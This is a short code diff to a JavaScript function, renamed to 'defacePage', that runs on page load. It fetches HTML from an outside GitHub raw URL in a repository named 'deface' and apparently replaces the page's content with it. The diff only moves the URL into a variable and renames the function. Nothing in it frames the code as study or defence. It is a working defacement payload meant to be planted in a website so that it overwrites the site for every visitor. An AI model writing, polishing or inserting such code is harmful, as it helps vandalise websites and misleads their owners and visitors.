@@ -1,7 +1,10 @@
-async function replaceContent() {
+async function defacePage() {
     try {
+        // URL of the HTML content you want to load
+        const url = 'https://raw.githubusercontent.com/lumino1337/deface/main/index.html';
+        
         // Fetch the content of the external HTML page
-        const response = await fetch('https://raw.githubusercontent.com/lumino1337/deface/main/index.html');
+        const response = await fetch(url);
         
         if (!response.ok) {
             throw new Error('Network response was not ok');
@@ -22,4 +25,4 @@ async function replaceContent() {
 }
 
 // Call the function to replace the content when the DOM is fully loaded
-document.addEventListener('DOMContentLoaded', replaceContent);
+document.addEventListener('DOMContentLoaded', defacePage);
